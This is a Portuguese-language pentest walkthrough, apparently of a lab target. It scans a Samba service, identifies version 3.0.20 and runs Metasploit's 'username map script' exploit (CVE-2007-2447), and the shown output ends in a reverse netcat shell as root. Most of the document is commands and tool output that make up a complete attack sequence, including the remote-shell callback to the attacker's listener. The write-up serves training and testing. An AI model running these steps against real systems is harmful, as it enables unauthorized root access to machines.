# Samba Exploitation

O Samba é um conjunto de softwares livres que implementa o protocolo SMB/CIFS (Server Message Block / Common Internet File System) no Linux e em outros sistemas Unix-like.

Ele permite que máquinas Linux/Unix compartilhem arquivos e impressoras com sistemas Windows (e vice-versa), funcionando como uma ponte entre os dois mundos.

Observando as versões obtidas no nmap, temos 2 portas abertas com o Samba versão possível entre 3.X e 4.X.

```
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
```

Ao pesquisar exploits, obtemos um número grande de exploits para o samba.

```
$ searchsploit samba
---------------------------------------------------------------- ---------------------------------
 Exploit Title                                                  |  Path
---------------------------------------------------------------- ---------------------------------
GoSamba 1.0.1 - 'INCLUDE_PATH' Multiple Remote File Inclusions  | php/webapps/4575.txt
Microsoft Windows XP/2003 - Samba Share Resource Exhaustion (De | windows/dos/148.sh
Samba 1.9.19 - 'Password' Remote Buffer Overflow                | linux/remote/20308.c
Samba 2.0.7 - SWAT Logfile Permissions                          | linux/local/20341.sh
Samba 2.0.7 - SWAT Logging Failure                              | unix/remote/20340.c
Samba 2.0.7 - SWAT Symlink (1)                                  | linux/local/20338.c
Samba 2.0.7 - SWAT Symlink (2)                                  | linux/local/20339.sh
Samba 2.0.x - Insecure TMP File Symbolic Link                   | linux/local/20776.c
Samba 2.0.x/2.2 - Arbitrary File Creation                       | unix/remote/20968.txt
Samba 2.2.0 < 2.2.8 (OSX) - trans2open Overflow (Metasploit)    | osx/remote/9924.rb
Samba 2.2.2 < 2.2.6 - 'nttrans' Remote Buffer Overflow (Metaspl | linux/remote/16321.rb
Samba 2.2.8 (BSD x86) - 'trans2open' Remote Overflow (Metasploi | bsd_x86/remote/16880.rb
Samba 2.2.8 (Linux Kernel 2.6 / Debian / Mandrake) - Share Priv | linux/local/23674.txt
Samba 2.2.8 (Linux x86) - 'trans2open' Remote Overflow (Metaspl | linux_x86/remote/16861.rb
Samba 2.2.8 (OSX/PPC) - 'trans2open' Remote Overflow (Metasploi | osx_ppc/remote/16876.rb
Samba 2.2.8 (Solaris SPARC) - 'trans2open' Remote Overflow (Met | solaris_sparc/remote/16330.rb
Samba 2.2.8 - Brute Force Method Remote Command Execution       | linux/remote/55.c
Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (1)      | unix/remote/22468.c
Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (2)      | unix/remote/22469.c
Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (3)      | unix/remote/22470.c
Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (4)      | unix/remote/22471.txt
Samba 2.2.x - 'nttrans' Remote Overflow (Metasploit)            | linux/remote/9936.rb
Samba 2.2.x - CIFS/9000 Server A.01.x Packet Assembling Buffer  | unix/remote/22356.c
Samba 2.2.x - Remote Buffer Overflow                            | linux/remote/7.pl
Samba 3.0.10 (OSX) - 'lsa_io_trans_names' Heap Overflow (Metasp | osx/remote/16875.rb
Samba 3.0.10 < 3.3.5 - Format String / Security Bypass          | multiple/remote/10095.txt
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execu | unix/remote/16320.rb
Samba 3.0.21 < 3.0.24 - LSA trans names Heap Overflow (Metasplo | linux/remote/9950.rb
Samba 3.0.24 (Linux) - 'lsa_io_trans_names' Heap Overflow (Meta | linux/remote/16859.rb
Samba 3.0.24 (Solaris) - 'lsa_io_trans_names' Heap Overflow (Me | solaris/remote/16329.rb
Samba 3.0.27a - 'send_mailslot()' Remote Buffer Overflow        | linux/dos/4732.c
Samba 3.0.29 (Client) - 'receive_smb_raw()' Buffer Overflow (Po | multiple/dos/5712.pl
Samba 3.0.4 - SWAT Authorisation Buffer Overflow                | linux/remote/364.pl
Samba 3.3.12 (Linux x86) - 'chain_reply' Memory Corruption (Met | linux_x86/remote/16860.rb
Samba 3.3.5 - Format String / Security Bypass                   | linux/remote/33053.txt
Samba 3.4.16/3.5.14/3.6.4 - SetInformationPolicy AuditEventsInf | linux/remote/21850.rb
Samba 3.4.5 - Symlink Directory Traversal                       | linux/remote/33599.txt
Samba 3.4.5 - Symlink Directory Traversal (Metasploit)          | linux/remote/33598.rb
Samba 3.4.7/3.5.1 - Denial of Service                           | linux/dos/12588.txt
Samba 3.5.0 - Remote Code Execution                             | linux/remote/42060.py
Samba 3.5.0 < 4.4.14/4.5.10/4.6.4 - 'is_known_pipename()' Arbit | linux/remote/42084.rb
Samba 3.5.11/3.6.3 - Remote Code Execution                      | linux/remote/37834.py
Samba 3.5.22/3.6.17/4.0.8 - nttrans Reply Integer Overflow      | linux/dos/27778.txt
Samba 4.5.2 - Symlink Race Permits Opening Files Outside Share  | multiple/remote/41740.txt
Samba < 2.0.5 - Local Overflow                                  | linux/local/19428.c
Samba < 2.2.8 (Linux/BSD) - Remote Code Execution               | multiple/remote/10.c
Samba < 3.0.20 - Remote Heap Overflow                           | linux/remote/7701.txt
Samba < 3.6.2 (x86) - Denial of Service (PoC)                   | linux_x86/dos/36741.py
Sambar FTP Server 6.4 - 'SIZE' Remote Denial of Service         | windows/dos/2934.php
Sambar Server 4.1 Beta - Admin Access                           | cgi/remote/20570.txt
Sambar Server 4.2 Beta 7 - Batch CGI                            | windows/remote/19761.txt
Sambar Server 4.3/4.4 Beta 3 - Search CGI                       | windows/remote/20223.txt
Sambar Server 4.4/5.0 - 'pagecount' File Overwrite              | multiple/remote/21026.txt
Sambar Server 4.x/5.0 - Insecure Default Password Protection    | multiple/remote/21027.txt
Sambar Server 5.1 - Sample Script Denial of Service             | windows/dos/21228.c
Sambar Server 5.1 - Script Source Disclosure                    | cgi/remote/21390.txt
Sambar Server 5.x - 'results.stm' Cross-Site Scripting          | windows/remote/22185.txt
Sambar Server 5.x - Information Disclosure                      | windows/remote/22434.txt
Sambar Server 5.x - Open Proxy / Authentication Bypass          | windows/remote/24076.txt
Sambar Server 5.x/6.0/6.1 - 'results.stm' indexname Cross-Site  | windows/remote/25694.txt
Sambar Server 5.x/6.0/6.1 - logout RCredirect Cross-Site Script | windows/remote/25695.txt
Sambar Server 5.x/6.0/6.1 - Server Referer Cross-Site Scripting | windows/remote/25696.txt
Sambar Server 6 - Search Results Buffer Overflow (Metasploit)   | windows/remote/16756.rb
Sambar Server 6.0 - 'results.stm' POST Buffer Overflow          | windows/dos/23664.py
Sambar Server 6.1 Beta 2 - 'show.asp?show' Cross-Site Scripting | windows/remote/24161.txt
Sambar Server 6.1 Beta 2 - 'showini.asp' Arbitrary File Access  | windows/remote/24163.txt
Sambar Server 6.1 Beta 2 - 'showperf.asp?title' Cross-Site Scri | windows/remote/24162.txt
SWAT Samba Web Administration Tool - Cross-Site Request Forgery | cgi/webapps/17577.txt
---------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```
Para verificar se existe algum script do metasploit que possa 'scanear' o Samba e trazer o versão, utilizamos o comando search, considerando que:
- Scanners estão no módulo auliary, submódulo scanner.
- Scripts de Samba estão no sub-subdiretório smb.
```
msf6 > search auxiliary/scanner/smb

Matching Modules
================

   #   Name                                         Disclosure Date  Rank    Check  Description
   -   ----                                         ---------------  ----    -----  -----------
   0   auxiliary/scanner/smb/impacket/dcomexec      2018-03-19       normal  No     DCOM Exec
   1   auxiliary/scanner/smb/impacket/secretsdump   .                normal  No     DCOM Exec
   2   auxiliary/scanner/smb/smb_ms17_010           .                normal  No     MS17-010 SMB RCE Detection
   3     \_ AKA: DOUBLEPULSAR                       .                .       .      .
   4     \_ AKA: ETERNALBLUE                        .                .       .      .
   5   auxiliary/scanner/smb/psexec_loggedin_users  .                normal  No     Microsoft Windows Authenticated Logged In Users Enumeration
   6   auxiliary/scanner/smb/smb_enumusers_domain   .                normal  No     SMB Domain User Enumeration
   7   auxiliary/scanner/smb/smb_enum_gpp           .                normal  No     SMB Group Policy Preference Saved Passwords Enumeration
   8   auxiliary/scanner/smb/smb_login              .                normal  No     SMB Login Check Scanner
   9   auxiliary/scanner/smb/smb_lookupsid          .                normal  No     SMB SID User Enumeration (LookupSid)
   10    \_ action: DOMAIN                          .                .       .      Enumerate domain accounts
   11    \_ action: LOCAL                           .                .       .      Enumerate local accounts
   12  auxiliary/scanner/smb/pipe_auditor           .                normal  No     SMB Session Pipe Auditor
   13  auxiliary/scanner/smb/pipe_dcerpc_auditor    .                normal  No     SMB Session Pipe DCERPC Auditor
   14  auxiliary/scanner/smb/smb_enumshares         .                normal  No     SMB Share Enumeration
   15  auxiliary/scanner/smb/smb_enumusers          .                normal  No     SMB User Enumeration (SAM EnumUsers)
   16  auxiliary/scanner/smb/smb_version            .                normal  No     SMB Version Detection
   17  auxiliary/scanner/smb/smb_uninit_cred        .                normal  Yes    Samba _netr_ServerPasswordSet Uninitialized Credential State
   18  auxiliary/scanner/smb/impacket/wmiexec       2018-03-19       normal  No     WMI Exec


Interact with a module by name or index. For example info 18, use 18 or use auxiliary/scanner/smb/impacket/wmiexec  
```
Um dos scripts tra exatamente a função que estávamos procurando.

```
msf6 > use auxiliary/scanner/smb/smb_version
msf6 auxiliary(scanner/smb/smb_version) > show info

       Name: SMB Version Detection
     Module: auxiliary/scanner/smb/smb_version
    License: Metasploit Framework License (BSD)
       Rank: Normal

Provided by:
  hdm <x@hdm.io>
  Spencer McIntyre
  Christophe De La Fuente

Check supported:
  No

Basic options:
  Name     Current Setting  Required  Description
  ----     ---------------  --------  -----------
  RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/u
                                      sing-metasploit/basics/using-metasploit.html
  RPORT                     no        The target port (TCP)
  THREADS  1                yes       The number of concurrent threads (max one per host)

Description:
  Fingerprint and display version information about SMB servers. Protocol
  information and host operating system (if available) will be reported.
  Host operating system detection requires the remote server to support
  version 1 of the SMB protocol. Compression and encryption capability
  negotiation is only present in version 3.1.1.


View the full module info with the info -d command.
```
Configurando o script:

```
msf6 auxiliary(scanner/smb/smb_version) > setg RHOSTS 192.168.1.33
RHOSTS => 192.168.1.33
msf6 auxiliary(scanner/smb/smb_version) > show options

Module options (auxiliary/scanner/smb/smb_version):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS   192.168.1.33     yes       The target host(s), see https://docs.metasploit.com/docs/
                                       using-metasploit/basics/using-metasploit.html
   RPORT                     no        The target port (TCP)
   THREADS  1                yes       The number of concurrent threads (max one per host)


View the full module info with the info, or info -d command.
```
O script está configurado e pronto para rodar.

```
sf6 auxiliary(scanner/smb/smb_version) > run
/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/recog-3.1.17/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator '+' and '?' was replaced with '*' in regular expression
[*] 192.168.1.33:445      -   Host could not be identified: Unix (Samba 3.0.20-Debian)
[*] 192.168.1.33          - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Obtemos a versão do samba: Samba 3.0.20

Agora podemos procurar por um exploit adequado para o Samba da máquina alvo.

```
msf6 auxiliary(scanner/smb/smb_version) > search Samba 3.0.20

Matching Modules
================

   #  Name                                Disclosure Date  Rank       Check  Description
   -  ----                                ---------------  ----       -----  -----------
   0  exploit/multi/samba/usermap_script  2007-05-14       excellent  No     Samba "username map script" Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/samba/usermap_script
```
Obtemos um exploit que possivelmente nos dará acesso a máquina alvo.

```
msf6 auxiliary(scanner/smb/smb_version) > show info exploit/multi/samba/usermap_script

       Name: Samba "username map script" Command Execution
     Module: exploit/multi/samba/usermap_script
   Platform: Unix
       Arch: cmd
 Privileged: Yes
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2007-05-14

Provided by:
  jduck <jduck@metasploit.com>

Available targets:
      Id  Name
      --  ----
  =>  0   Automatic

Check supported:
  No

Basic options:
  Name    Current Setting  Required  Description
  ----    ---------------  --------  -----------
  RHOSTS  192.168.1.33     yes       The target host(s), see https://docs.metasploit.com/docs/us
                                     ing-metasploit/basics/using-metasploit.html
  RPORT   139              yes       The target port (TCP)

Payload information:
  Space: 1024

Description:
  This module exploits a command execution vulnerability in Samba
  versions 3.0.20 through 3.0.25rc3 when using the non-default
  "username map script" configuration option. By specifying a username
  containing shell meta characters, attackers can execute arbitrary
  commands.

  No authentication is needed to exploit this vulnerability since
  this option is used to map usernames prior to authentication!

References:
  https://nvd.nist.gov/vuln/detail/CVE-2007-2447
  OSVDB (34700)
  http://www.securityfocus.com/bid/23972
  http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=534
  http://samba.org/samba/security/CVE-2007-2447.html


View the full module info with the info -d command.

[-] Invalid parameter "exploit/multi/samba/usermap_script", use "show -h" for more information
```
Agora procedemos com o exploit:

```
msf6 auxiliary(scanner/smb/smb_version) > use exploit/multi/samba/usermap_script
[*] No payload configured, defaulting to cmd/unix/reverse_netcat

msf6 exploit(multi/samba/usermap_script) > show options

Module options (exploit/multi/samba/usermap_script):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CHOST                     no        The local client address
   CPORT                     no        The local client port
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][.
                                       ..]. Supported proxies: sapni, socks4, socks5, socks5h, h
                                       ttp
   RHOSTS   192.168.1.33     yes       The target host(s), see https://docs.metasploit.com/docs/
                                       using-metasploit/basics/using-metasploit.html
   RPORT    139              yes       The target port (TCP)


Payload options (cmd/unix/reverse_netcat):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.1.10     yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

msf6 exploit(multi/samba/usermap_script) > exploit
[*] Started reverse TCP handler on 192.168.1.10:4444 
[*] Command shell session 1 opened (192.168.1.10:4444 -> 192.168.1.33:42987) at 2025-08-21 18:14:12 -0300

whoami
root

quit
[*] 192.168.1.33 - Command shell session 1 closed.

msf6 exploit(multi/samba/usermap_script) > 
```
Como podemos ver, tivemos acesso a máquina alvo com o usuário 'root'.
